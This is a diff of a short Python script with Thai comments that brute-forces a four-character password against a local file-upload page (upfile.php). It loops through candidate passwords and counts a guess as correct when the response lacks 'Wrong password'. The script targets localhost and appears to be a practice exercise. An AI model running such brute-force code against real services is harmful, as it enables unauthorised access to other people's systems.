@@ -1,35 +1,10 @@
 # import library ที่เกี่ยวข้อง
 from urllib.request import Request, urlopen
 
-# host
+# host name
 url = 'http://localhost:8080/upfile.php'
-
-# ดึงข้อมูล tag html ที่แสดงบนเว็บนำมานับจำนวนบรรทัด
-def getHTML():
-    global html
-    try:
-        req = Request(url)
-        html = len(urlopen(req).read().decode('utf-8').split('\n'))
-    except:
-        print('exception')
-
-# ส่ง password มา post ตรวจสอบว่าใช่ password นี้ไหม
-def sendPassword(password):
-    # กำหนดข้อมูลที่จะ post
-    post_data = '?action=do_upload&password=' + password
-    link = url + post_data
-    try:
-        req = Request(link)
-        txt_res = urlopen(req).read().decode('utf-8')
-        res = len(txt_res.split('\n'))
-
-        # ตรวจสอบจำนวนบรรทัดของหน้าปกติกับหน้าส่ง password ว่าเท่ากันไหม หรือข้อความหน้าส่ง password มีคำว่า 'Wrong password'
-        if(res == html or txt_res.find('Wrong password') != -1):
-            return False
-        else:
-            return True
-    except:
-        print('exception')
+# ค่าที่จะส่ง
+post_data = '?action=do_upload&password='
 
 def createPass():
     # กำหนดขอบเขตของการค้นหา
@@ -40,12 +15,30 @@ def createPass():
             for c in data:
                 for d in data:
                     password = a + '' + b + '' + c + '' + d
-                    # ถ้า password ถูกต้องให้หยุดการทำงาน
-                    if(sendPassword(password)):
+                    try:
+                        # ส่งรหัส
+                        res = sendPassword(password)
+                    except:
+                        # ถ้าเกิด Exception ให้หยุด
+                        print('exception')
+                        return False
+                    if(res):
+                        # ถ้า password ถูกต้องให้หยุดการทำงาน
                         print(password + ' : YES')
-                        return True
+                        return res
                     else:
                         print(password + ' : NO')
+
+# ส่ง password มา post ตรวจสอบว่าใช่ password นี้ไหม
+def sendPassword(password):
+    # กำหนดข้อมูลที่จะ post
+    link = url + post_data + password
+    # ส่ง request
+    req = Request(link)
+    # รับค่าผลลัพธ์เป็น code html ของหน้าเว็บ
+    res = urlopen(req).read().decode('utf-8')
+    # ตรวจสอบข้อความหลังจากส่ง password มีคำว่า 'Wrong password' หรือไม่?
+    return not res.find('Wrong password') != -1
 
 def test(password):
     if(sendPassword(password)):
@@ -53,9 +46,9 @@ def test(password):
     else:
         print('NO')
 
-getHTML()
 createPass()
 
 # ฟังก์ชันสำหรับทดสอบ
 # test('')      # NO
+# test('0000')  # NO
 # test('1234')  # YES
